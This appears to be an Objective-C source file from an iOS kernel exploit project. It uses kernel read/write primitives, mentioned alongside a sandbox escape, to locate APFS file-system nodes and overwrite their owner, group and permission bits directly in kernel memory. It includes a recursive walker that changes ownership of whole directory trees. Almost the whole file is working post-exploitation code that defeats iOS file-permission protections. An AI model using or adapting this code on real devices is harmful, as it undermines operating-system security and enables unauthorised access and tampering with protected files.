/*
 * apfs_own.m — 1:1 port of lara/kexploit/pe/apfs.m
 *
 * Walk: fd -> self_proc->p_fd->fd_ofiles[fd] -> fileproc->fp_glob
 *       -> fileglob->fg_data (vnode) -> v_data (apfs_fsnode)
 * Then modify apfs_fsnode.uid / gid / mode directly in kernel memory.
 *
 * apfs_fsnode lives in a regular writable zone (not ZC_READONLY / PPL),
 * so socket-based kR/W works on iOS 17.0 through 26.x — unlike the
 * ucred/proc_ro writes which are blocked.
 */

#import <Foundation/Foundation.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stddef.h>
#include <dirent.h>
#include <string.h>
#include <limits.h>

#include "apfs_own.h"
#include "kexploit/kutils.h"
#include "kexploit/krw.h"
#include "kexploit/offsets.h"
#include "kexploit/xpaci.h"
#include "kexploit/vnode.h"

// Verbatim from lara/kexploit/pe/apfs.m. We only touch uid/gid/mode, but
// keeping the full layout so offsetof() stays correct if lara updates it.
struct apfs_fsnode {
    uint8_t             type;
    uint8_t             _type_pad[7];
    uint64_t            ino;

    union {
        uint64_t        jhash_prev;
        struct {
            uint32_t    _jhash_prev_lo;
            uint16_t    xattr_count;
            uint16_t    xattr_flags;
        };
    };

    uint64_t            jhash_next;

    union {
        uint64_t        parent_ino_or_owner_vnode;
        struct {
            uint32_t    parent_ino_lo;
            uint16_t    parent_sub;
            uint16_t    _parent_pad;
        };
    };

    uint32_t            nstream_id;

    union {
        uint32_t        internal_flags;
        struct {
            uint8_t     reclaim_flag;
            uint8_t     busy_flag;
            uint16_t    internal_flags_hi;
        };
    };

    void                *jhash_gate;

    union {
        uint64_t        internal_link;
        struct {
            uint8_t     _link_base;
            uint8_t     snap_rename_flag;
            uint16_t    _link_pad;
            uint32_t    snap_mount_state;
        };
    };

    uint64_t            graft_state;
    uint64_t            snap_state;
    uint64_t            fake_getattr_data;
    uint64_t            mnomap_data;
    uint64_t            cleanup_data;

    union {
        uint64_t        crypto_state;
        struct {
            uint8_t     _crypto_base;
            uint8_t     crypto_class;
            uint8_t     crypto_flags;
            uint8_t     _crypto_pad;
            uint32_t    crypto_extra;
        };
    };

    uint32_t            bsd_flags;
    uint32_t            gen_flags;
    uint64_t            mmap_state;
    uid_t               uid;
    gid_t               gid;
    uint16_t            mode;
    uint16_t            open_refcnt;
    uint32_t            ino_flags_ext;
    uint64_t            raw_enc_data;
};

// Primary: open()-based. Needs read permission on the target, so it can
// hit EACCES on root-owned 0600/0700 files that our sandbox escape doesn't
// bypass (sandbox clears MAC, not DAC).
static uint64_t getvnodefor_open(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd == -1) return (uint64_t)-1;

    uint64_t self_proc = proc_self();
    if (!self_proc) { close(fd); return (uint64_t)-1; }

    uint64_t fileprocPtrArr = kread64(self_proc + off_proc_p_fd + off_filedesc_fd_ofiles);
    fileprocPtrArr = xpaci(fileprocPtrArr);
    if (!fileprocPtrArr) { close(fd); return (uint64_t)-1; }

    uint64_t fileproc = kread64(fileprocPtrArr + (8 * fd));
    if (!fileproc) { close(fd); return (uint64_t)-1; }

    uint64_t fp_glob = kread64(fileproc + off_fileproc_fp_glob);
    fp_glob = xpaci(fp_glob);
    if (!fp_glob) { close(fd); return (uint64_t)-1; }

    uint64_t vnode = kread64(fp_glob + off_fileglob_fg_data);
    vnode = xpaci(vnode);

    close(fd);
    return vnode;
}

// Fallback for directories: chdir-based. Only needs x perm on parent chain,
// not r perm on target. We reset cwd afterwards.
static uint64_t getvnodefor_chdir(const char *path) {
    char oldcwd[PATH_MAX];
    if (!getcwd(oldcwd, sizeof(oldcwd))) oldcwd[0] = '\0';
    if (chdir(path) != 0) return (uint64_t)-1;

    uint64_t self_proc = proc_self();
    uint64_t vnode = kread64(self_proc + off_proc_p_fd + off_filedesc_fd_cdir);
    vnode = xpaci(vnode);

    if (oldcwd[0]) chdir(oldcwd);
    else chdir("/");
    return vnode;
}

static uint64_t getvnodefor(const char *path) {
    uint64_t v = getvnodefor_open(path);
    if (v != (uint64_t)-1 && v != 0) return v;
    // Fallback: chdir works for directories even when open() fails EACCES.
    return getvnodefor_chdir(path);
}

static uint64_t get_fsnode(const char *path) {
    uint64_t vnode = getvnodefor(path);
    if (vnode == (uint64_t)-1 || !vnode) return 0;
    uint64_t fs_node = kread64(vnode + off_vnode_v_data);
    return fs_node;
}

uint32_t apfs_getuid_kr(const char *path) {
    uint64_t fs_node = get_fsnode(path);
    if (!fs_node) return 0;
    return kread32(fs_node + offsetof(struct apfs_fsnode, uid));
}

uint32_t apfs_getgid_kr(const char *path) {
    uint64_t fs_node = get_fsnode(path);
    if (!fs_node) return 0;
    return kread32(fs_node + offsetof(struct apfs_fsnode, gid));
}

uint16_t apfs_getmode_kr(const char *path) {
    uint64_t fs_node = get_fsnode(path);
    if (!fs_node) return 0;
    return kread16(fs_node + offsetof(struct apfs_fsnode, mode));
}

int apfs_own(const char *path, uid_t uid, gid_t gid) {
    uint64_t fs_node = get_fsnode(path);
    if (!fs_node) {
        NSLog(@"[APFS] own: unable to get fs_node: %s", path);
        return -1;
    }

    // Sanity check: kernel-read uid must match what stat() reports, or the
    // struct layout is wrong and we'd corrupt an unrelated field.
    struct stat st_before;
    if (stat(path, &st_before) == 0) {
        uint32_t kuid = kread32(fs_node + offsetof(struct apfs_fsnode, uid));
        if (kuid != st_before.st_uid) {
            NSLog(@"[APFS] own: layout mismatch for %s (stat uid=%u, kernel uid=%u); aborting",
                  path, st_before.st_uid, kuid);
            return -1;
        }
    }

    kwrite32(fs_node + offsetof(struct apfs_fsnode, uid), uid);
    kwrite32(fs_node + offsetof(struct apfs_fsnode, gid), gid);

    sync(); sync(); sync();

    struct stat st;
    if (stat(path, &st) != 0) {
        NSLog(@"[APFS] own: stat() failed after write: %s", path);
        return -1;
    }
    if (st.st_uid != uid || st.st_gid != gid) {
        NSLog(@"[APFS] own: verify failed (got uid=%u gid=%u, expected %u/%u): %s",
              st.st_uid, st.st_gid, uid, gid, path);
        return -1;
    }

    NSLog(@"[APFS] own: %s -> uid=%u gid=%u", path, uid, gid);
    return 0;
}

// Fast path: skip per-entry sync/stat verify. Used by the bulk tree walker.
// Returns 0 on success (readback matched), -1 on failure.
static int apfs_own_unsafe(const char *path, uid_t uid, gid_t gid,
                           uint32_t *out_before_uid) {
    uint64_t fs_node = get_fsnode(path);
    if (!fs_node) return -1;

    uint32_t before = kread32(fs_node + offsetof(struct apfs_fsnode, uid));
    if (out_before_uid) *out_before_uid = before;

    kwrite32(fs_node + offsetof(struct apfs_fsnode, uid), uid);
    kwrite32(fs_node + offsetof(struct apfs_fsnode, gid), gid);

    // Kernel-side read-back: if the write didn't take, we haven't changed
    // anything and the caller should count this as a failure.
    uint32_t after = kread32(fs_node + offsetof(struct apfs_fsnode, uid));
    if (after != uid) return -1;
    return 0;
}

// Skip subtrees iOS validates by ownership — chown'ing these breaks codesign
// or FairPlay DRM and can brick the app.
static int is_skip_name(const char *name) {
    return strcmp(name, "_CodeSignature") == 0 ||
           strcmp(name, "SC_Info") == 0;
}

static long chown_walk(const char *path, uid_t uid, gid_t gid, int depth,
                       long *skipped_lstat, long *skipped_chown, long *skipped_opendir) {
    if (depth > 32) return 0;

    struct stat st;
    if (lstat(path, &st) != 0) { (*skipped_lstat)++; return 0; }
    if (S_ISLNK(st.st_mode)) return 0;

    long n = 0;
    uint32_t before_uid = (uint32_t)-1;
    int rc = apfs_own_unsafe(path, uid, gid, &before_uid);
    if (rc == 0) {
        n++;
        // Log first few successful chowns (non-no-op) to prove writes work.
        if (before_uid != uid && n <= 5) {
            NSLog(@"[APFS] chown'd: %s (uid %u -> %u)", path, before_uid, uid);
        }
    } else {
        (*skipped_chown)++;
        if (*skipped_chown <= 5) {
            NSLog(@"[APFS] skipped chown: %s (before=%u errno=%d)",
                  path, before_uid, errno);
        }
    }

    if (S_ISDIR(st.st_mode)) {
        DIR *d = opendir(path);
        if (!d) {
            (*skipped_opendir)++;
            if (*skipped_opendir <= 5)
                NSLog(@"[APFS] skipped opendir: %s (errno=%d)", path, errno);
            return n;
        }
        struct dirent *e;
        while ((e = readdir(d)) != NULL) {
            if (strcmp(e->d_name, ".") == 0 || strcmp(e->d_name, "..") == 0) continue;
            if (is_skip_name(e->d_name)) continue;
            char child[PATH_MAX];
            int len = snprintf(child, sizeof(child), "%s/%s", path, e->d_name);
            if (len <= 0 || len >= (int)sizeof(child)) continue;
            n += chown_walk(child, uid, gid, depth + 1,
                            skipped_lstat, skipped_chown, skipped_opendir);
        }
        closedir(d);
    }
    return n;
}

long apfs_own_tree(const char *root, uid_t uid, gid_t gid) {
    NSLog(@"[APFS] own_tree: walking %s -> uid=%u gid=%u", root, uid, gid);
    long skipped_lstat = 0, skipped_chown = 0, skipped_opendir = 0;
    long n = chown_walk(root, uid, gid, 0,
                        &skipped_lstat, &skipped_chown, &skipped_opendir);
    sync(); sync(); sync();
    NSLog(@"[APFS] own_tree: chown'd %ld entries under %s "
          "(skipped: lstat=%ld chown=%ld opendir=%ld)",
          n, root, skipped_lstat, skipped_chown, skipped_opendir);
    return n;
}

int apfs_mod(const char *path, mode_t mode) {
    uint64_t fs_node = get_fsnode(path);
    if (!fs_node) {
        NSLog(@"[APFS] mod: unable to get fs_node: %s", path);
        return -1;
    }

    struct stat st_before;
    if (stat(path, &st_before) == 0) {
        uint16_t kmode = kread16(fs_node + offsetof(struct apfs_fsnode, mode));
        if (kmode != (st_before.st_mode & 0xFFFF)) {
            NSLog(@"[APFS] mod: layout mismatch for %s (stat mode=0%o, kernel=0%o); aborting",
                  path, st_before.st_mode & 0xFFFF, kmode);
            return -1;
        }
    }

    kwrite16(fs_node + offsetof(struct apfs_fsnode, mode), (uint16_t)mode);

    sync(); sync(); sync();

    struct stat st;
    if (stat(path, &st) != 0) return -1;
    if ((st.st_mode & 0xFFFF) != (mode & 0xFFFF)) {
        NSLog(@"[APFS] mod: verify failed (got 0%o, expected 0%o): %s",
              st.st_mode & 0xFFFF, mode, path);
        return -1;
    }

    NSLog(@"[APFS] mod: %s -> 0%o", path, mode);
    return 0;
}
